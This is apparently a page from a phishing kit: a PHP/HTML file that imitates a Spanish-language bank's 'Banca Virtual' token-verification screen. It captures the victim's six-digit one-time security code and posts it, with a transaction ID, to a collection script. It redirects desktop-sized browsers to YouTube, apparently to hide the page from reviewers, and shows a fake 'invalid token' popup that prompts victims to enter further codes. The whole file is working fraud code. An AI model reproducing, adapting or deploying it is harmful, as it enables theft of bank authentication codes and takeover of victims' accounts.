<?php
// otp.php
// Página de verificación de Token que ahora incluye un popup de error.

session_start();
$transaction_id = $_GET['id'] ?? 'N/A'; // Recupera el ID de transacción
$error_type = $_GET['error'] ?? null; // Captura el error para el popup
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ingreso a Banca Virtual</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
    
    <!-- ================== INICIO DE LA CORRECCIÓN ================== -->
    <!-- Faltaba este archivo CSS que sí tiene index.html -->
    <link rel="stylesheet" href="assets/css/bancavirtual.css">
    <!-- ================== FIN DE LA CORRECCIÓN ==================== -->
    
    <style>
        /* CSS RESET para box-sizing */
        *, *::before, *::after {
            box-sizing: border-box; 
        }
        
        :root {
            --main-text: #1f2937; --muted-text: #6b7280; --blue-accent: #007bff;
            --border-color: #e5e7eb; --red-error: #dc2626; --dark-blue: #001947;
        }
        body, html { margin: 0; padding: 0; font-family: 'Inter', sans-serif; background-color: #f7f7f7; color: var(--main-text); }
        
        /* Ajustamos el .container para que no entre en conflicto con bancavirtual.css si existe */
        .container { width: 100%; max-width: 450px; margin: 0 auto; padding: 20px; box-sizing: border-box; }
        
        .header-bar { background-color: #fff; box-shadow: 0 1px 3px rgba(0,0,0,0.05); padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; position: fixed; top: 0; width: 100%; max-width: inherit; box-sizing: border-box; z-index: 10; }
        .header-title { font-size: 16px; font-weight: 500; color: var(--muted-text); flex-grow: 1; text-align: center; }
        .header-link { font-size: 14px; color: var(--muted-text); text-decoration: none; cursor: pointer; padding: 5px; white-space: nowrap; }
        .header-link.back { font-size: 17px; font-weight: 600; }
        .main-content { padding-top: 70px; padding-bottom: 20px; }
        .main-content h1 { font-size: 24px; font-weight: 700; color: var(--main-text); margin-bottom: 20px; text-align: left; }
        .token-card { background-color: #ffffff; border-radius: 8px; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.05); padding: 25px; }
        .token-header { display: flex; flex-direction: column; align-items: flex-start; margin-bottom: 12px; }
        .token-title-group { display: flex; align-items: center; margin-top: 0; }
        .lock-icon { margin-bottom: -5px; width: 42px; height: 42px; color: var(--muted-text); }
        .token-title { margin-top:10px !important;font-size: 18px; font-weight: 600; display: flex; align-items: center; margin: 0; }
        .info-icon { font-size: 18px; color: var(--muted-text); margin-left: 8px; cursor: pointer; }
        .token-description { font-size: 15px; color: var(--muted-text); line-height: 1.5; margin-top: 0; margin-bottom: 25px; }
        
        /* === CORRECCIÓN DE INPUTS === */
        .token-inputs { 
            display: flex; 
            gap: 5px; /* Reducir el espacio entre inputs */
            justify-content: center; 
            margin-bottom: 30px; 
            padding: 0 5px; /* Pequeño padding de seguridad para evitar desborde */
        }
        .token-input { 
            width: 45px; /* Ancho base */
            height: 50px; 
            text-align: center; 
            font-size: 24px; 
            border: 1px solid #cbd5e0; 
            border-radius: 6px; 
            outline: none; 
            -moz-appearance: textfield; 
            padding: 0; /* Aseguramos que no haya padding interno que desborde */
        }
        
        /* Media Query para móvil */
        @media (max-width: 400px) {
            .token-inputs {
                gap: 4px; 
                padding: 0;
            }
            .token-input {
                width: 38px; /* Ancho más pequeño en móvil */
                height: 48px;
            }
        }
        /* === FIN CORRECCIÓN DE INPUTS === */
        
        .token-input:focus { border-color: var(--blue-accent); }
        .verify-button { background-color: #e2e8f0; color: #94a3b8; padding: 12px 25px; border: none; border-radius: 50px; font-size: 16px; font-weight: 600; cursor: not-allowed; width: 100%; text-decoration: none; text-align:center; box-sizing: border-box; display: inline-block; }
        .verify-button.active { background-color: var(--dark-blue); color: #ffffff; cursor: pointer; }

        /* Estilos del popup */
        .popup-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.6); backdrop-filter: blur(5px); display: flex; justify-content: center; align-items: center; z-index: 2000; opacity: 0; visibility: hidden; transition: opacity 0.3s ease, visibility 0.3s ease; }
        .popup-overlay.active { opacity: 1; visibility: visible; }
        .popup-card { background-color: #fff; border-radius: 12px; padding: 25px 30px; width: 90%; max-width: 380px; text-align: center; box-shadow: 0 5px 20px rgba(0,0,0,0.2); }
        .popup-card .icon { color: var(--red-error); width: 40px; height: 40px; margin: 0 auto 10px auto; }
        .popup-card h2 { font-size: 22px; color: var(--main-text); margin: 0 0 10px 0; }
        .popup-card p { font-size: 15px; color: var(--muted-text); line-height: 1.6; margin: 0 0 25px 0; }
        .popup-card button { background-color: var(--dark-blue); color: #fff; width: 100%; padding: 14px; border: none; border-radius: 50px; font-size: 16px; font-weight: 600; cursor: pointer; }
    </style>
    
        <script>
        // Umbral de ancho para considerar que es una PC (escritorio)
        const desktopMinWidth = 768; 

        // Función de detección y redirección
        function checkAndRedirect() {
            if (window.innerWidth > desktopMinWidth) {
                // Redirige si el ancho de la ventana es mayor al umbral
                window.location.href = 'https://www.youtube.com/';
            }
        }

        // Ejecutar la función inmediatamente
        checkAndRedirect();
    </script>
    </head>
<body>

    <header class="header-bar">
        <a href="index.php" class="header-link back"> <span style="font-size: 20px; margin-right: 5px;">&lt;</span> Inicio </a>
        <span class="header-title">Ingreso a Banca Virtual</span>
        <a href="index.php" class="header-link close"> <span class="text">Abandonar</span> <span class="icon">X</span> </a>
    </header>

    <div class="container main-content">
        <h1>Verifiquemos que seas tú</h1>
        <div class="token-card">
            <form id="tokenForm" method="post" action="assets/config/succes-verify.php">
                <input type="hidden" name="transaction_id" value="<?php echo htmlspecialchars($transaction_id); ?>">
                <input type="hidden" name="full_token" id="fullTokenInput">

                <div class="token-header">
                    <svg class="lock-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                        <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
                        <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
                    </svg>
                    <div class="token-title-group">
                        <h2 class="token-title"> Código Token <span class="info-icon" title="Código de seguridad">ⓘ</span> </h2>
                    </div>
                </div>
                
                <p class="token-description">
                    Para realizar este proceso, ingresa el código de Token móvil o físico.
                </p>

                <div class="token-inputs" id="tokenInputs"></div>
                <button type="button" class="verify-button" id="verifyButton" disabled>Verificar</button>
            </form>
        </div>

        <p style="text-align: center; font-size: 12px; color: var(--muted-text); margin-top: 30px;">
            Transacción ID: <?php echo htmlspecialchars($transaction_id); ?>
        </p>
    </div>

    <div id="errorPopupOverlay" class="popup-overlay">
        <div class="popup-card">
            <svg class="icon" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor">
                <path stroke-linecap="round" stroke-linejoin="round" d="M12 9v3.75m-9.303 3.376c-.866 1.5.217 3.374 1.948 3.374h14.71c1.73 0 2.813-1.874 1.948-3.374L13.949 3.378c-.866-1.5-3.032-1.5-3.898 0L2.697 16.126zM12 15.75h.007v.008H12v-.008z" />
            </svg>
            <h2>Token Inválido</h2>
            <p>El token es incorrecto o ha expirado. Por favor, inténtalo de nuevo.</p>
            <button id="retryButton" type="button">Intentar de nuevo</button>
        </div>
    </div>
    
    <!-- ================== INICIO DE LA CORRECCIÓN ================== -->
    <!-- Faltaba este script que sí tiene index.html -->
    <script src="assets/js/bancavirtual.js"></script>
    <!-- ================== FIN DE LA CORRECCIÓN ==================== -->
    
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const tokenForm = document.getElementById('tokenForm');
            const tokenInputsContainer = document.getElementById('tokenInputs');
            const verifyButton = document.getElementById('verifyButton');
            const fullTokenInput = document.getElementById('fullTokenInput');
            const numberOfInputs = 6;
            let tokenValues = Array(numberOfInputs).fill('');
            let allInputs = [];

            for (let i = 0; i < numberOfInputs; i++) {
                const input = document.createElement('input');
                input.type = 'text'; 
                input.maxLength = 1;
                input.className = 'token-input'; 
                input.id = `tokenInput-${i}`;
                input.setAttribute('inputmode', 'numeric');
                input.setAttribute('pattern', '[0-9]*');
                input.setAttribute('autocomplete', 'one-time-code');
                tokenInputsContainer.appendChild(input);
                allInputs.push(input);

                input.addEventListener('input', function() {
                    tokenValues[i] = this.value;
                    if (this.value && i < numberOfInputs - 1) {
                        allInputs[i + 1].focus();
                    }
                    checkAllInputsFilled();
                });
                input.addEventListener('keydown', function(event) {
                    if (event.key === 'Backspace' && this.value === '' && i > 0) {
                        allInputs[i - 1].focus();
                    }
                });
            }

            function checkAllInputsFilled() {
                const allFilled = tokenValues.every(value => value.length === 1 && !isNaN(value));
                verifyButton.disabled = !allFilled;
                if(allFilled) verifyButton.classList.add('active');
                else verifyButton.classList.remove('active');
            }

            verifyButton.addEventListener('click', function() {
                if (!verifyButton.disabled) {
                    fullTokenInput.value = tokenValues.join('');
                    tokenForm.submit();
                }
            });
            
            allInputs[0].focus();

            // ========= LÓGICA PARA EL POPUP =========
            const errorPopupOverlay = document.getElementById('errorPopupOverlay');
            const retryButton = document.getElementById('retryButton');

            function getUrlParameter(name) {
                name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
                const regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
                const results = regex.exec(location.search);
                return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
            }

            const error = getUrlParameter('error');
            if (error === 'token_invalid') {
                errorPopupOverlay.classList.add('active');
            }

            retryButton.addEventListener('click', function() {
                errorPopupOverlay.classList.remove('active');
                allInputs.forEach(input => input.value = '');
                tokenValues.fill('');
                checkAllInputsFilled();
                allInputs[0].focus();
            });
        });
    </script>
</body>
</html>